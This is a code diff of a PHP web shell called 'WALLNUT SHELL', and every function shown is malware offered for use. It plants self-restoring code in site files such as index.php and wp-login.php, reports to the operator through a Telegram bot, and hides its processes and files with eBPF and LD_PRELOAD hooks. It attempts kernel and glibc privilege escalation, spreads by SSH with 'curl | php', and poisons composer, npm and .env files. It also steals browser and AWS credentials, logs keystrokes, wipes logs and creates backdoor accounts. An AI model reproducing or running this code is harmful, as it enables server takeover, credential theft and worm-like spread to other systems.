@@ -1,6 +1,6 @@
 <?php
-//WALLNUT SHELL - By Dkid03
-// Don't CHANGE THE AUTHOR 
+// WALLNUT SHELL - By Dkid03
+// DON'T CHANGE THE AUTHOR 
 $CURRENT_SHELL = basename(__FILE__);
 
 function auto_restore_by_name() {
@@ -66,7 +66,10 @@ $botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
 $telegramUserId = '7547598395';
 $verifCode = 'Dkid@123';
 
-if (!function_exists('shell_exec')) {
+$shellExecAvailable = function_exists('shell_exec') && 
+    !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions') ?: '')));
+
+if (!$shellExecAvailable && !function_exists('shell_exec')) {
     function shell_exec($cmd) { return 'shell_exec tidak tersedia di server ini.'; }
 }
 
@@ -123,7 +126,7 @@ function sendTelegramMessage($botToken, $chatId, $message) {
 function isRoot() {
     if (!function_exists('shell_exec')) return false;
     $output = @shell_exec('whoami 2>/dev/null');
-    return trim($output) === 'root';
+    return trim((string)$output) === 'root';
 }
 
 function isShellExecAvailable() {
@@ -135,11 +138,12 @@ function isShellExecAvailable() {
 function isChattrAvailable() {
     if (!isShellExecAvailable()) return false;
     $output = @shell_exec('which chattr 2>/dev/null');
-    return !empty(trim($output));
+    return !empty(trim((string)$output));
 }
 
 function formatSize($bytes) {
-    if ($bytes === false || $bytes === null) return '0 bytes';
+    if ($bytes === false || $bytes === null || !is_numeric($bytes)) return '0 bytes';
+    $bytes = (float)$bytes;
     if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
     if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
     if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
@@ -228,7 +232,7 @@ function get_all_domains_by_ip_cached($ttl = 300) {
     $domains = [];
     $ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';
     if (empty($ip) && function_exists('shell_exec')) {
-        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\''));
+        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\'') ?: '');
     }
     $ip = trim($ip);
     if (file_exists('/etc/userdomains')) {
@@ -345,27 +349,34 @@ function get_best_document_root($domain, $roots) {
         (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
     ];
     foreach ($roots as $root) {
-        if (strpos($root, $domain) !== false) { $candidates[] = $root; }
-        $path_parts = explode('/', $root);
-        foreach ($path_parts as $part) {
-            if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
-                $candidates[] = $root;
-                break;
+        if (is_string($root) && strpos($root, $domain) !== false) { $candidates[] = $root; }
+        if (is_string($root)) {
+            $path_parts = explode('/', $root);
+            foreach ($path_parts as $part) {
+                if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
+                    $candidates[] = $root;
+                    break;
+                }
             }
         }
     }
-    usort($candidates, function($a, $b) {
-        $a_score = (strpos($a, 'public_html') !== false) ? 3 : 0;
-        $a_score += (strpos($a, 'www') !== false) ? 2 : 0;
-        $a_score += (strpos($a, 'html') !== false) ? 1 : 0;
-        $b_score = (strpos($b, 'public_html') !== false) ? 3 : 0;
-        $b_score += (strpos($b, 'www') !== false) ? 2 : 0;
-        $b_score += (strpos($b, 'html') !== false) ? 1 : 0;
-        return $b_score - $a_score;
-    });
     $candidates = array_unique($candidates);
+    $scored = [];
     foreach ($candidates as $path) {
-        if ($path && is_dir($path) && is_writable($path)) { return $path; }
+        if (empty($path)) continue;
+        $score = 0;
+        if (strpos($path, 'public_html') !== false) $score += 3;
+        if (strpos($path, 'www') !== false) $score += 2;
+        if (strpos($path, 'html') !== false) $score += 1;
+        $scored[] = ['path' => $path, 'score' => $score];
+    }
+    usort($scored, function($a, $b) {
+        return $b['score'] - $a['score'];
+    });
+    foreach ($scored as $item) {
+        if ($item['path'] && is_dir($item['path']) && is_writable($item['path'])) { 
+            return $item['path']; 
+        }
     }
     return false;
 }
@@ -392,17 +403,9 @@ function get_file_location() {
     ];
 }
 
-// ============================================================
-// INJECT RESTORE - WALLNUT EDITION (FIXED)
-// ============================================================
-
-if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+function inject_restore_wallnut() {
     global $CURRENT_SHELL, $botToken, $telegramUserId;
-    
-    if (empty($CURRENT_SHELL)) {
-        $CURRENT_SHELL = basename(__FILE__);
-    }
-    
+    if (empty($CURRENT_SHELL)) $CURRENT_SHELL = basename(__FILE__);
     $targetFiles = [
         __DIR__ . '/index.php',
         __DIR__ . '/wp-login.php',
@@ -411,117 +414,74 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
         __DIR__ . '/wp-load.php',
         __DIR__ . '/settings.php'
     ];
-    
-    // Build restore code dengan HEREDOC
-    $restoreCode = <<<EOT
-
-// ===== WALLNUT AUTO RESTORE =====
-if (!function_exists("wallnut_restore_{$CURRENT_SHELL}")) {
-    function wallnut_restore_{$CURRENT_SHELL}() {
-        \$current_file = "{$CURRENT_SHELL}";
-        if (!file_exists(__DIR__ . "/" . \$current_file)) {
-            \$backup_locations = [
-                "/tmp/" . md5(\$current_file) . ".inc",
-                "/var/tmp/" . md5(\$current_file) . ".inc",
-                "/dev/shm/" . md5(\$current_file) . ".inc",
-                __DIR__ . "/.cache/" . \$current_file . ".inc"
+    $restoreCode = '
+if (!function_exists("wallnut_restore_' . md5($CURRENT_SHELL) . '")) {
+    function wallnut_restore_' . md5($CURRENT_SHELL) . '() {
+        $current_file = "' . $CURRENT_SHELL . '";
+        if (!file_exists(__DIR__ . "/" . $current_file)) {
+            $backup_locations = [
+                "/tmp/" . md5($current_file) . ".inc",
+                "/var/tmp/" . md5($current_file) . ".inc",
+                "/dev/shm/" . md5($current_file) . ".inc",
+                __DIR__ . "/.cache/" . $current_file . ".inc"
             ];
-            foreach (\$backup_locations as \$backup) {
-                if (file_exists(\$backup)) {
-                    @copy(\$backup, __DIR__ . "/" . \$current_file);
-                    @chmod(__DIR__ . "/" . \$current_file, 0644);
-                    \$domain = \$_SERVER["HTTP_HOST"] ?? "localhost";
-                    \$protocol = (isset(\$_SERVER["HTTPS"]) ? "https://" : "http://");
-                    \$url = \$protocol . \$domain . "/" . \$current_file;
-                    @file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$telegramUserId}&text=" . urlencode("✅ RESTORED: " . \$url));
+            foreach ($backup_locations as $backup) {
+                if (file_exists($backup)) {
+                    @copy($backup, __DIR__ . "/" . $current_file);
+                    @chmod(__DIR__ . "/" . $current_file, 0644);
+                    $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
+                    $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
+                    $url = $protocol . $domain . "/" . $current_file;
+                    @file_get_contents("https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $telegramUserId . '&text=" . urlencode("✅ RESTORED: " . $url));
                     break;
                 }
             }
         }
-        \$backup = "/tmp/" . md5(\$current_file) . ".inc";
-        if (!file_exists(\$backup) && file_exists(__DIR__ . "/" . \$current_file)) {
-            @copy(__DIR__ . "/" . \$current_file, \$backup);
-            @chmod(\$backup, 0444);
+        $backup = "/tmp/" . md5($current_file) . ".inc";
+        if (!file_exists($backup) && file_exists(__DIR__ . "/" . $current_file)) {
+            @copy(__DIR__ . "/" . $current_file, $backup);
+            @chmod($backup, 0444);
         }
     }
-    wallnut_restore_{$CURRENT_SHELL}();
+    wallnut_restore_' . md5($CURRENT_SHELL) . '();
 }
-// ===== WALLNUT AUTO RESTORE END =====
-EOT;
-    
-    $injected = [];
-    $errors = [];
-    $exists = [];
-    
+';
+    $injected = []; $errors = [];
     foreach ($targetFiles as $file) {
-        if (!file_exists($file)) {
-            $errors[] = basename($file) . " (not found)";
-            continue;
-        }
-        if (!is_writable($file)) {
-            @chmod($file, 0644);
-            if (!is_writable($file)) {
-                $errors[] = basename($file) . " (not writable)";
-                continue;
+        if (file_exists($file) && is_writable($file)) {
+            $content = file_get_contents($file);
+            if ($content !== false && strpos($content, 'WALLNUT AUTO RESTORE') === false) {
+                if (strpos($content, '<?php') === 0) {
+                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
+                } else {
+                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
+                }
+                if (file_put_contents($file, $newContent) !== false) {
+                    $injected[] = basename($file);
+                } else {
+                    $errors[] = basename($file) . " (gagal tulis)";
+                }
+            } else if ($content !== false && strpos($content, 'WALLNUT AUTO RESTORE') !== false) {
+                $injected[] = basename($file) . " (sudah ada)";
+            } else {
+                $errors[] = basename($file) . " (gagal baca)";
             }
-        }
-        
-        $content = @file_get_contents($file);
-        if ($content === false) {
-            $errors[] = basename($file) . " (failed to read)";
-            continue;
-        }
-        
-        // Cek apakah sudah terinject
-        if (strpos($content, 'WALLNUT AUTO RESTORE') !== false) {
-            $exists[] = basename($file) . " (already)";
-            continue;
-        }
-        
-        // Inject
-        if (strpos($content, '<?php') === 0) {
-            $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
         } else {
-            $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
-        }
-        
-        if (@file_put_contents($file, $newContent) !== false) {
-            $injected[] = basename($file);
-            @chmod($file, 0644);
-        } else {
-            $errors[] = basename($file) . " (failed to write)";
+            $errors[] = basename($file) . " (tidak ditemukan/tidak writable)";
         }
     }
-    
-    // Backup
-    $mainBackup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
-    if (!file_exists($mainBackup)) {
-        @copy(__FILE__, $mainBackup);
-        @chmod($mainBackup, 0444);
+    $backup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
+    if (!file_exists($backup)) {
+        @copy(__FILE__, $backup);
+        @chmod($backup, 0444);
     }
-    
-    // Notifikasi
     $msg = "🔧 *Inject Restore Code*\n"
          . "📁 Shell: " . $CURRENT_SHELL . "\n"
          . "✅ Berhasil: " . implode(", ", $injected) . "\n";
-    if (!empty($errors)) {
-        $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
-    }
-    if (!empty($exists)) {
-        $msg .= "⏭️ Sudah ada: " . implode(", ", $exists) . "\n";
-    }
-    
+    if (!empty($errors)) $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
     sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    echo "✅ Inject selesai!\n";
-    echo "📁 Shell: " . $CURRENT_SHELL . "\n";
-    echo "📁 " . implode("\n📁 ", $injected);
-    if (!empty($errors)) {
-        echo "\n❌ " . implode("\n❌ ", $errors);
-    }
-    if (!empty($exists)) {
-        echo "\n⏭️ " . implode("\n⏭️ ", $exists);
-    }
+    echo "✅ Inject selesai!\n📁 Shell: " . $CURRENT_SHELL . "\n📁 " . implode("\n📁 ", $injected);
+    if (!empty($errors)) echo "\n❌ " . implode("\n❌ ", $errors);
     exit;
 }
 
@@ -532,6 +492,7 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
 function hide_process_ebpf($process_name, $action = 'hide') {
     global $botToken, $telegramUserId;
     $results = [];
+    $process_name = substr((string)$process_name, 0, 16);
     if ($action === 'hide') {
         $results[] = "[1] Installing eBPF process hider...";
         $ebpf_code = '
@@ -545,7 +506,7 @@ int BPF_KPROBE(hide_process, struct linux_dirent64* dirp) {
     bpf_get_current_comm(comm, sizeof(comm));
     #pragma unroll
     for (int i = 0; i < 16; i++) {
-        if (comm[i] != "' . substr($process_name, 0, 16) . '"[i]) {
+        if (comm[i] != "' . $process_name . '"[i]) {
             return 0;
         }
     }
@@ -558,7 +519,7 @@ int BPF_KPROBE(hide_process32, struct linux_dirent* dirp) {
     bpf_get_current_comm(comm, sizeof(comm));
     #pragma unroll
     for (int i = 0; i < 16; i++) {
-        if (comm[i] != "' . substr($process_name, 0, 16) . '"[i]) {
+        if (comm[i] != "' . $process_name . '"[i]) {
             return 0;
         }
     }
@@ -650,11 +611,13 @@ int scandir(const char* dir, struct dirent*** namelist,
         sendTelegramMessage($botToken, $telegramUserId, $msg);
         return ['status' => 'success', 'message' => $msg];
     }
+    return ['status' => 'error', 'message' => 'Invalid action'];
 }
 
 function hide_file_ebpf($file, $action = 'hide') {
     global $botToken, $telegramUserId;
     $results = [];
+    $file_name = basename((string)$file);
     if ($action === 'hide') {
         $results[] = "[1] Installing eBPF file hider...";
         $ebpf_file_code = '
@@ -667,7 +630,7 @@ int BPF_KPROBE(hide_open, const char* filename, int flags) {
     bpf_probe_read_user_str(name, sizeof(name), filename);
     #pragma unroll
     for (int i = 0; i < 256; i++) {
-        if (name[i] != "' . basename($file) . '"[i]) {
+        if (name[i] != "' . $file_name . '"[i]) {
             break;
         }
         if (name[i] == 0) {
@@ -683,7 +646,7 @@ int BPF_KPROBE(hide_openat, const char* filename) {
     bpf_probe_read_user_str(name, sizeof(name), filename);
     #pragma unroll
     for (int i = 0; i < 256; i++) {
-        if (name[i] != "' . basename($file) . '"[i]) {
+        if (name[i] != "' . $file_name . '"[i]) {
             break;
         }
         if (name[i] == 0) {
@@ -707,7 +670,7 @@ int BPF_KPROBE(hide_openat, const char* filename) {
 #include <sys/stat.h>
 #include <stdio.h>
 
-static const char* hidden_files[] = {"' . basename($file) . '", NULL};
+static const char* hidden_files[] = {"' . $file_name . '", NULL};
 
 struct dirent* readdir(DIR* dirp) {
     struct dirent* (*orig_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
@@ -766,15 +729,18 @@ int open(const char* path, int flags, ...) {
             @shell_exec('ldconfig 2>/dev/null');
             $results[] = "✅ File hooks installed";
         }
-        $deep_hide = '/tmp/.cache/.system/' . md5(basename($file));
+        $deep_hide = '/tmp/.cache/.system/' . md5($file_name);
         @mkdir('/tmp/.cache/.system/', 0700, true);
-        @rename($file, $deep_hide);
-        @chmod($deep_hide, 0600);
-        $results[] = "✅ File moved to: $deep_hide";
+        if (file_exists($file)) {
+            @rename($file, $deep_hide);
+            @chmod($deep_hide, 0600);
+            $results[] = "✅ File moved to: $deep_hide";
+        }
         $msg = "ADVANCED FILE HIDING\n\n" . implode("\n", $results);
         sendTelegramMessage($botToken, $telegramUserId, $msg);
         return ['status' => 'success', 'message' => $msg];
     }
+    return ['status' => 'error', 'message' => 'Invalid action'];
 }
 
 function edr_bypass_ultimate() {
@@ -838,7 +804,7 @@ function auto_root_modern() {
     $results[] = "Target: " . php_uname('a');
     $results[] = "[1] CVE-2023-35001 (Linux Kernel nftables)...";
     $kernel = @shell_exec('uname -r 2>/dev/null');
-    if (strpos($kernel, '5.15') !== false || strpos($kernel, '5.10') !== false) {
+    if (is_string($kernel) && (strpos($kernel, '5.15') !== false || strpos($kernel, '5.10') !== false)) {
         $exploit = '
 #include <stdio.h>
 #include <stdlib.h>
@@ -860,24 +826,24 @@ int main() {
         @shell_exec('gcc /tmp/cve-2023-35001.c -o /tmp/cve-2023-35001 2>/dev/null');
         @shell_exec('chmod +x /tmp/cve-2023-35001 2>/dev/null');
         $test = @shell_exec('/tmp/cve-2023-35001 -c "id" 2>/dev/null');
-        if (strpos($test, 'uid=0') !== false) {
+        if (is_string($test) && strpos($test, 'uid=0') !== false) {
             $results[] = "✅ CVE-2023-35001 exploited!";
             $exploited = true;
         }
     }
     $results[] = "[2] CVE-2023-2640 (GameOver Ubuntu)...";
     $lsb = @shell_exec('lsb_release -a 2>/dev/null');
-    if (strpos($lsb, 'Ubuntu 22.04') !== false || strpos($lsb, 'Ubuntu 23.04') !== false) {
+    if (is_string($lsb) && (strpos($lsb, 'Ubuntu 22.04') !== false || strpos($lsb, 'Ubuntu 23.04') !== false)) {
         $cmd = 'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/ && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')" 2>/dev/null';
         $test = @shell_exec($cmd . ' -c "id" 2>/dev/null');
-        if (strpos($test, 'uid=0') !== false) {
+        if (is_string($test) && strpos($test, 'uid=0') !== false) {
             $results[] = "✅ CVE-2023-2640 exploited!";
             $exploited = true;
         }
     }
     $results[] = "[3] CVE-2023-4911 (Looney Tunables)...";
     $glibc = @shell_exec('ldd --version 2>/dev/null | head -1');
-    if (strpos($glibc, '2.34') !== false || strpos($glibc, '2.35') !== false) {
+    if (is_string($glibc) && (strpos($glibc, '2.34') !== false || strpos($glibc, '2.35') !== false)) {
         $looney = '
 #include <stdio.h>
 #include <stdlib.h>
@@ -896,7 +862,7 @@ int main() {
         @shell_exec('gcc /tmp/looney.c -o /tmp/looney 2>/dev/null');
         @shell_exec('chmod +x /tmp/looney 2>/dev/null');
         $test = @shell_exec('/tmp/looney -c "id" 2>/dev/null');
-        if (strpos($test, 'uid=0') !== false) {
+        if (is_string($test) && strpos($test, 'uid=0') !== false) {
             $results[] = "✅ CVE-2023-4911 exploited!";
             $exploited = true;
         }
@@ -949,9 +915,10 @@ function worm_spread_to_domains($currentFile) {
                         preg_match_all('/\b([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\b/', $hosts, $matches2);
                         $all_hosts = array_merge($matches[1], $matches2[1]);
                         $all_hosts = array_unique($all_hosts);
+                        $http_host = $_SERVER['HTTP_HOST'] ?? 'localhost';
                         foreach ($all_hosts as $host) {
                             if (!empty($host) && !in_array($host, $infected)) {
-                                $cmd = "ssh -i " . escapeshellarg($key) . " -o StrictHostKeyChecking=no -o ConnectTimeout=5 " . escapeshellarg($host) . " 'curl -s --connect-timeout 5 http://" . $_SERVER['HTTP_HOST'] . "/" . basename($currentFile) . " 2>/dev/null | php 2>/dev/null' 2>/dev/null &";
+                                $cmd = "ssh -i " . escapeshellarg($key) . " -o StrictHostKeyChecking=no -o ConnectTimeout=5 " . escapeshellarg($host) . " 'curl -s --connect-timeout 5 http://" . $http_host . "/" . basename($currentFile) . " 2>/dev/null | php 2>/dev/null' 2>/dev/null &";
                                 @shell_exec($cmd);
                                 $infected[] = $host;
                                 $spread_count++;
@@ -977,7 +944,7 @@ function worm_spread_to_domains($currentFile) {
 int main() {
     setuid(0); 
     setgid(0);
-    system("curl -s http://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . ' | php");
+    system("curl -s http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . ' | php");
     return 0;
 }
 ';
@@ -1020,7 +987,7 @@ int main() {
         if (is_writable($file)) {
             $content = @file_get_contents($file);
             if ($content && strpos($content, 'wallnut-shell') === false) {
-                $payload = '"wallnut-shell": "https://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . '"';
+                $payload = '"wallnut-shell": "https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '"';
                 $new_content = preg_replace('/"require":\s*{/', '"require": {' . $payload . ',', $content, 1);
                 if ($new_content && $new_content !== $content) {
                     @file_put_contents($file, $new_content);
@@ -1039,7 +1006,7 @@ int main() {
         if (is_writable($file)) {
             $content = @file_get_contents($file);
             if ($content && strpos($content, 'wallnut-shell') === false) {
-                $payload = '"wallnut-shell": "git+https://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . '"';
+                $payload = '"wallnut-shell": "git+https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '"';
                 $new_content = preg_replace('/"dependencies":\s*{/', '"dependencies": {' . $payload . ',', $content, 1);
                 if ($new_content && $new_content !== $content) {
                     @file_put_contents($file, $new_content);
@@ -1054,7 +1021,7 @@ int main() {
     $env_files = array_merge($env_files, @glob('/var/www/*/.env'));
     foreach ($env_files as $file) {
         if (is_writable($file)) {
-            @file_put_contents($file, "\nAUTO_PREPEND_FILE=http://" . $_SERVER['HTTP_HOST'] . "/" . basename($currentFile) . "\n", FILE_APPEND);
+            @file_put_contents($file, "\nAUTO_PREPEND_FILE=http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/" . basename($currentFile) . "\n", FILE_APPEND);
             $supply_count++;
             $supplyLinks[] = "ENV: $file";
             $results[] = "✅ .env infected: $file";
@@ -1076,7 +1043,7 @@ int main() {
 int main() {
     int fd = memfd_create("wallnut_persist", MFD_CLOEXEC);
     if (fd < 0) return 1;
-    const char* payload = "<?php include(\'http://' . $_SERVER['HTTP_HOST'] . '/' . basename($currentFile) . '\'); ?>";
+    const char* payload = "<?php include(\'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '\'); ?>";
     write(fd, payload, strlen(payload));
     char cmd[512];
     sprintf(cmd, "php /proc/self/fd/%d &", fd);
@@ -1147,7 +1114,6 @@ int main() {
     $results[] = "Traditional copy: $copy_count files";
     
     $total_spread = $spread_count + $exploit_count + $supply_count + $copy_count + $inject_count;
-    
     $results[] = "SUMMARY";
     $results[] = "Total spread: $total_spread targets";
     $results[] = "  SSH: $spread_count";
@@ -1164,34 +1130,28 @@ int main() {
          . "  📦 Supply Chain: $supply_count\n"
          . "  📁 Copy: $copy_count\n"
          . "  🌐 Web Inject: $inject_count\n\n";
-    
     if (!empty($domainLinks)) {
-        $msg .= "🌐 DOMAIN LINKS:\n";
-        $msg .= implode("\n", array_slice($domainLinks, 0, 30));
+        $msg .= "🌐 DOMAIN LINKS:\n" . implode("\n", array_slice($domainLinks, 0, 30));
         if (count($domainLinks) > 30) $msg .= "\n... and " . (count($domainLinks) - 30) . " more";
         $msg .= "\n\n";
     }
     if (!empty($sshLinks)) {
-        $msg .= "🔑 SSH TARGETS:\n";
-        $msg .= implode("\n", array_slice($sshLinks, 0, 20));
+        $msg .= "🔑 SSH TARGETS:\n" . implode("\n", array_slice($sshLinks, 0, 20));
         if (count($sshLinks) > 20) $msg .= "\n... and " . (count($sshLinks) - 20) . " more";
         $msg .= "\n\n";
     }
     if (!empty($exploitLinks)) {
-        $msg .= "💥 EXPLOIT TARGETS:\n";
-        $msg .= implode("\n", array_slice($exploitLinks, 0, 20));
+        $msg .= "💥 EXPLOIT TARGETS:\n" . implode("\n", array_slice($exploitLinks, 0, 20));
         if (count($exploitLinks) > 20) $msg .= "\n... and " . (count($exploitLinks) - 20) . " more";
         $msg .= "\n\n";
     }
     if (!empty($supplyLinks)) {
-        $msg .= "📦 SUPPLY CHAIN:\n";
-        $msg .= implode("\n", array_slice($supplyLinks, 0, 20));
+        $msg .= "📦 SUPPLY CHAIN:\n" . implode("\n", array_slice($supplyLinks, 0, 20));
         if (count($supplyLinks) > 20) $msg .= "\n... and " . (count($supplyLinks) - 20) . " more";
         $msg .= "\n\n";
     }
     if (!empty($injectLinks)) {
-        $msg .= "🌐 WEB INJECT:\n";
-        $msg .= implode("\n", array_slice($injectLinks, 0, 20));
+        $msg .= "🌐 WEB INJECT:\n" . implode("\n", array_slice($injectLinks, 0, 20));
         if (count($injectLinks) > 20) $msg .= "\n... and " . (count($injectLinks) - 20) . " more";
         $msg .= "\n\n";
     }
@@ -1250,7 +1210,7 @@ WantedBy=default.target';
 int main() {
     int fd = memfd_create("wallnut_persist", MFD_CLOEXEC);
     if (fd < 0) return 1;
-    const char* payload = "<?php include(\'http://' . $_SERVER['HTTP_HOST'] . '/' . basename(__FILE__) . '\'); ?>";
+    const char* payload = "<?php include(\'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename(__FILE__) . '\'); ?>";
     write(fd, payload, strlen(payload));
     char cmd[512];
     sprintf(cmd, "php /proc/self/fd/%d &", fd);
@@ -1270,6 +1230,7 @@ int main() {
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/prctl.h>
 
 int system(const char* command) {
     int (*orig_system)(const char*) = dlsym(RTLD_NEXT, "system");
@@ -1314,21 +1275,23 @@ function credential_harvest_advanced() {
     ];
     foreach ($browser_paths as $pattern) {
         $files = @glob($pattern);
-        foreach ($files as $file) {
-            if (is_readable($file)) {
-                if (strpos($file, '.db') !== false || strpos($file, 'Login Data') !== false) {
-                    @shell_exec("sqlite3 " . escapeshellarg($file) . " \"SELECT origin_url, username_value, password_value FROM logins\" 2>/dev/null > /tmp/browser_passwords.txt");
-                    $content = @file_get_contents('/tmp/browser_passwords.txt');
-                    if ($content) {
-                        $creds[] = "Browser passwords from $file:\n$content";
+        if (is_array($files)) {
+            foreach ($files as $file) {
+                if (is_readable($file)) {
+                    if (strpos($file, '.db') !== false || strpos($file, 'Login Data') !== false) {
+                        @shell_exec("sqlite3 " . escapeshellarg($file) . " \"SELECT origin_url, username_value, password_value FROM logins\" 2>/dev/null > /tmp/browser_passwords.txt");
+                        $content = @file_get_contents('/tmp/browser_passwords.txt');
+                        if ($content) {
+                            $creds[] = "Browser passwords from $file:\n$content";
+                        }
+                    } else {
+                        $content = @file_get_contents($file);
+                        if ($content && preg_match_all('/"username":"([^"]+)","password":"([^"]+)"/', $content, $matches)) {
+                            $creds[] = "Firefox passwords from $file:\n" . implode("\n", array_map(function($u, $p) { return "$u:$p"; }, $matches[1], $matches[2]));
+                        }
                     }
-                } else {
-                    $content = @file_get_contents($file);
-                    if ($content && preg_match_all('/"username":"([^"]+)","password":"([^"]+)"/', $content, $matches)) {
-                        $creds[] = "Firefox passwords from $file:\n" . implode("\n", array_map(function($u, $p) { return "$u:$p"; }, $matches[1], $matches[2]));
-                    }
+                    $results[] = "✅ Browser passwords extracted: $file";
                 }
-                $results[] = "✅ Browser passwords extracted: $file";
             }
         }
     }
@@ -1336,17 +1299,19 @@ function credential_harvest_advanced() {
     $aws_paths = ['/home/*/.aws/credentials', '/root/.aws/credentials'];
     foreach ($aws_paths as $pattern) {
         $files = @glob($pattern);
-        foreach ($files as $file) {
-            if (is_readable($file)) {
-                $content = @file_get_contents($file);
-                if ($content) {
-                    preg_match_all('/aws_access_key_id\s*=\s*([^\s]+)/', $content, $keys);
-                    preg_match_all('/aws_secret_access_key\s*=\s*([^\s]+)/', $content, $secrets);
-                    if (!empty($keys[1]) && !empty($secrets[1])) {
-                        $creds[] = "AWS Credentials from $file:\nKey: " . $keys[1][0] . "\nSecret: " . $secrets[1][0];
+        if (is_array($files)) {
+            foreach ($files as $file) {
+                if (is_readable($file)) {
+                    $content = @file_get_contents($file);
+                    if ($content) {
+                        preg_match_all('/aws_access_key_id\s*=\s*([^\s]+)/', $content, $keys);
+                        preg_match_all('/aws_secret_access_key\s*=\s*([^\s]+)/', $content, $secrets);
+                        if (!empty($keys[1]) && !empty($secrets[1])) {
+                            $creds[] = "AWS Credentials from $file:\nKey: " . $keys[1][0] . "\nSecret: " . $secrets[1][0];
+                        }
                     }
+                    $results[] = "✅ AWS credentials: $file";
                 }
-                $results[] = "✅ AWS credentials: $file";
             }
         }
     }
@@ -1589,7 +1554,7 @@ function clean_logs_aggressive() {
             }
         }
     }
-    $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
+    $users = explode("\n", @shell_exec('ls /home 2>/dev/null') ?: '');
     $users[] = 'root';
     foreach ($users as $user) {
         $user = trim($user);
@@ -1827,7 +1792,7 @@ function create_ssh() {
         return ['status' => 'error', 'message' => implode("\n", $result)];
     }
     $exists = @shell_exec("id $user 2>/dev/null");
-    if (!empty($exists)) {
+    if (!empty(trim((string)$exists))) {
         $result[] = "ERROR: User '$user' already exists";
         sendTelegramMessage($botToken, $telegramUserId, "SSH USER FAILED\n\n" . implode("\n", $result));
         return ['status' => 'error', 'message' => implode("\n", $result)];
@@ -1864,13 +1829,13 @@ function create_rdp() {
         return ['status' => 'error', 'message' => implode("\n", $result)];
     }
     $xrdp = @shell_exec('which xrdp 2>/dev/null');
-    if (empty($xrdp)) {
+    if (empty(trim((string)$xrdp))) {
         $result[] = "WARNING: xrdp not installed";
     } else {
         $result[] = "xrdp installed";
     }
     $exists = @shell_exec("id $user 2>/dev/null");
-    if (!empty($exists)) {
+    if (!empty(trim((string)$exists))) {
         $result[] = "ERROR: User '$user' already exists";
         sendTelegramMessage($botToken, $telegramUserId, "RDP USER FAILED\n\n" . implode("\n", $result));
         return ['status' => 'error', 'message' => implode("\n", $result)];
@@ -1899,7 +1864,7 @@ function create_ftp() {
         return ['status' => 'error', 'message' => implode("\n", $result)];
     }
     $exists = @shell_exec("id $user 2>/dev/null");
-    if (!empty($exists)) {
+    if (!empty(trim((string)$exists))) {
         $result[] = "ERROR: User '$user' already exists";
         sendTelegramMessage($botToken, $telegramUserId, "FTP ACCOUNT FAILED\n\n" . implode("\n", $result));
         return ['status' => 'error', 'message' => implode("\n", $result)];
@@ -2201,7 +2166,7 @@ function keylogger() {
     $action = isset($_GET['action']) ? $_GET['action'] : 'start';
     $result = [];
     $python = @shell_exec('which python3 2>/dev/null') ?: @shell_exec('which python 2>/dev/null');
-    if (empty($python)) {
+    if (empty(trim((string)$python))) {
         return ['status' => 'error', 'message' => 'Python not installed'];
     }
     if ($action === 'start') {
@@ -2263,7 +2228,7 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 function cron_persistence() {
     global $botToken, $telegramUserId;
     $action = isset($_GET['action']) ? $_GET['action'] : 'install';
-    $interval = isset($_GET['interval']) ? $_GET['interval'] : '5';
+    $interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 5;
     $result = [];
     if ($action === 'install') {
         $cron_jobs = [
@@ -2860,10 +2825,6 @@ if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] <= 1800) {
     }
 }
 
-// ============================================================
-// HANDLER GET - SEMUA FITUR
-// ============================================================
-
 if (isset($_GET['hide_process_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
